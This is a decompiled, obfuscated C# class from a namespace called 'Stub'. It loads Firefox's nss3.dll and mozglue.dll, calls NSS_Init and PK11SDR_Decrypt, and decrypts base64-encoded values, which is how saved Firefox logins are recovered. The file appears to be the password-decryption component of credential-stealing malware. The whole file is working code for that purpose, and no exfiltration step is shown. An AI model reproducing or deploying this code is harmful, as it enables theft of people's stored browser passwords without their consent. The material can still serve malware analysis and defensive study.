using System;
using System.Runtime.InteropServices;
using System.Text;

namespace Stub
{
	// Token: 0x02000052 RID: 82
	public static class GClass4
	{
		// Token: 0x06000110 RID: 272 RVA: 0x00006A48 File Offset: 0x00004C48
		public static bool smethod_0(string String_0)
		{
			bool result;
			try
			{
				GClass4.intptr_1 = Class22.LoadLibrary(String_0 + "\\mozglue.dll");
				GClass4.intptr_0 = Class22.LoadLibrary(String_0 + "\\nss3.dll");
				IntPtr procAddress = Class22.GetProcAddress(GClass4.intptr_0, "NSS_Init");
				IntPtr procAddress2 = Class22.GetProcAddress(GClass4.intptr_0, "PK11SDR_Decrypt");
				IntPtr procAddress3 = Class22.GetProcAddress(GClass4.intptr_0, "NSS_Shutdown");
				GClass4.delegate10_0 = (Class23.Delegate10)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(Class23.Delegate10));
				GClass4.delegate12_0 = (Class23.Delegate12)Marshal.GetDelegateForFunctionPointer(procAddress2, typeof(Class23.Delegate12));
				GClass4.delegate11_0 = (Class23.Delegate11)Marshal.GetDelegateForFunctionPointer(procAddress3, typeof(Class23.Delegate11));
				result = true;
			}
			catch (Exception ex)
			{
				string str = "Failed to load NSS\n";
				Exception ex2 = ex;
				Console.WriteLine(str + ((ex2 != null) ? ex2.ToString() : null));
				result = false;
			}
			return result;
		}

		// Token: 0x06000111 RID: 273 RVA: 0x000022C0 File Offset: 0x000004C0
		public static void smethod_1()
		{
			GClass4.delegate11_0();
			Class22.FreeLibrary(GClass4.intptr_0);
			Class22.FreeLibrary(GClass4.intptr_1);
		}

		// Token: 0x06000112 RID: 274 RVA: 0x000022E3 File Offset: 0x000004E3
		public static bool smethod_2(string String_0)
		{
			return GClass4.delegate10_0(String_0) == 0L;
		}

		// Token: 0x06000113 RID: 275 RVA: 0x00006B34 File Offset: 0x00004D34
		public static string smethod_3(string String_0)
		{
			IntPtr intPtr = IntPtr.Zero;
			try
			{
				byte[] array = Convert.FromBase64String(String_0);
				intPtr = Marshal.AllocHGlobal(array.Length);
				Marshal.Copy(array, 0, intPtr, array.Length);
				Class23.Struct9 @struct = default(Class23.Struct9);
				Class23.Struct9 struct2 = default(Class23.Struct9);
				struct2.int_0 = 0;
				struct2.intptr_0 = intPtr;
				struct2.int_1 = array.Length;
				if (GClass4.delegate12_0(ref struct2, ref @struct, 0) == 0 && @struct.int_1 != 0)
				{
					byte[] array2 = new byte[@struct.int_1];
					Marshal.Copy(@struct.intptr_0, array2, 0, @struct.int_1);
					return Encoding.UTF8.GetString(array2);
				}
			}
			catch (Exception value)
			{
				Console.WriteLine(value);
				return null;
			}
			finally
			{
				if (intPtr != IntPtr.Zero)
				{
					Marshal.FreeHGlobal(intPtr);
				}
			}
			return null;
		}

		// Token: 0x06000114 RID: 276 RVA: 0x00003710 File Offset: 0x00001910
		public static string smethod_4(string String_0)
		{
			string result;
			try
			{
				byte[] bytes = Encoding.Default.GetBytes(String_0);
				result = Encoding.UTF8.GetString(bytes);
			}
			catch
			{
				result = String_0;
			}
			return result;
		}

		// Token: 0x040000CF RID: 207
		public static IntPtr intptr_0;

		// Token: 0x040000D0 RID: 208
		public static IntPtr intptr_1;

		// Token: 0x040000D1 RID: 209
		public static Class23.Delegate10 delegate10_0;

		// Token: 0x040000D2 RID: 210
		public static Class23.Delegate12 delegate12_0;

		// Token: 0x040000D3 RID: 211
		public static Class23.Delegate11 delegate11_0;
	}
}
